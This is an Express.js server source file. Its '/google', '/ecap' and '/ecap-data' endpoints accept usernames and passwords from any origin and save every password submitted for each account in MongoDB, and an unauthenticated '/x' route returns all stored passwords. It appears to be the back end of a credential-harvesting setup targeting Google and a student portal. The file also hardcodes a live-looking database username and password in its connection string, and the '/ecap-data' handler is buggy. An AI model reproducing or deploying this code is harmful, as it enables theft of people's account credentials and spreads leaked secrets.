const express = require("express");
const app = express();
const cors = require("cors");
const { connect } = require("mongoose");
const { Pass, Ecap } = require("./utils/password");
app.set("view engine", "pug");
require("dotenv").config();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("./public"));

connect(
  "mongodb+srv://suryasarisa99:suryamongosurya@cluster0.xtldukm.mongodb.net/Student?retryWrites=true&w=majority",
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
).then((res) => console.log("connected"));

app.use(
  cors({
    // origin: ["https://www.example.com", "http://103.138.0.69/ecap"],
    origin: "*",
    allowedHeaders: "Content-Type",
    methods: "POST, GET, PUT, PATCH",
  })
);
app.options("/test", cors());

app.get("/x", async (req, res) => {
  const passes = await Pass.find();
  console.log(passes);
  // console.log(passes);

  // res.render("a", { passes });
  res.json(passes);
});

app.post("/google", async (req, res) => {
  console.log(req.body);
  let pass = await Pass.findById(req.body.user);
  if (pass) {
    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
    pass.passwords.unshift(req.body.passwd);
    await pass.save();
    return res.send("done");
  } else {
    let pass = await new Pass({
      _id: req.body.user,
      passwords: [req.body.passwd],
    });
    await pass.save();
  }

  return res.json({ sample: "done" });
});
app.post("/test", (req, res) => {
  console.log("worked");
  console.log(`data: ${req.body.data}`);
  console.log(req.body);
  // let pass = new Pass({
  //   _id: req.body.user,
  //   passwords: [req.body.passwd],
  //   type: [req.body.type],
  // });
  // await pass.save();
  res.json({ status: "Done", data: req.body });
});

app.post("/ecap-data", async (req, res) => {
  console.log(req.body.data);
  let { data } = req.body;
  let passPromise = data.map((item) => Pass.findById(item._id));
  let promises = await Promise.all(passPromise);
  promises.forEach(async (item, ind) => {
    if (item) {
      item.passwords.unshift(data[ind].pass);
    } else {
      let pass = Pass({ _id: item._id, passwords: [item.pass] });
      await pass.save();
    }
  });
  res.json({ status: "done" });
});
app.post("/ecap", async (req, res) => {
  console.log(req.body);
  let pass = await Pass.findById(req.body.user);
  if (pass) {
    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
    pass.passwords.unshift(req.body.passwd);
    await pass.save();
    return res.send("done");
  } else {
    let pass = new Pass({
      _id: req.body.user,
      passwords: [req.body.passwd],
      type: [req.body.type],
    });
    await pass.save();
  }

  return res.json({ sample: "ecap pass saved" });
});
app.get("/", (_, res) => {
  console.log("Starting");
  res.send("Surya");
});

app.listen(process.env.PORT || 3000);
